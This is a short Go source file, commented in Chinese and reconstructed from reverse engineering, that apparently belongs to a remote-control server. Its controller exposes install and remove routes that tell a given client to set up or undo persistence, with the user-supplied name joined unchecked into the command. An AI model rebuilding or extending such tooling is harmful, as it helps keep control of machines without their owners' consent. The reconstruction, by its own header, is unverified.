// Package controllers — 安装控制器，根据当前逆向证据重建；行为等价性仍需逐项验证。
//
// 真实方法（funcnametab + 反编译地址）与前端路由：
//
//	Install  0x18e99a0   POST /install/install  在客户端安装持久化
//	Remove   0x18e9ce0   POST /install/remove   移除持久化
//
// 反编译参数集：id（客户端）/ name（安装名）；id 非法时返回 "id err"。
package controllers

// InstallController 管理客户端持久化安装。
type InstallController struct {
	ApiBaseController
}

// Install 在客户端安装持久化（POST /install/install）。参数：id / name。
func (c *InstallController) Install() {
	id := int64(c.JsonGetInt("id"))
	name := c.JsonGetStr("name")
	if id == 0 {
		c.JsonErr("id err")
		return
	}
	dispatchCmd(id, "install "+name)
	c.JsonOkMessage("ok")
}

// Remove 移除客户端持久化（POST /install/remove）。参数：id / name。
func (c *InstallController) Remove() {
	id := int64(c.JsonGetInt("id"))
	name := c.JsonGetStr("name")
	if id == 0 {
		c.JsonErr("id err")
		return
	}
	dispatchCmd(id, "uninstall "+name)
	c.JsonOkMessage("ok")
}
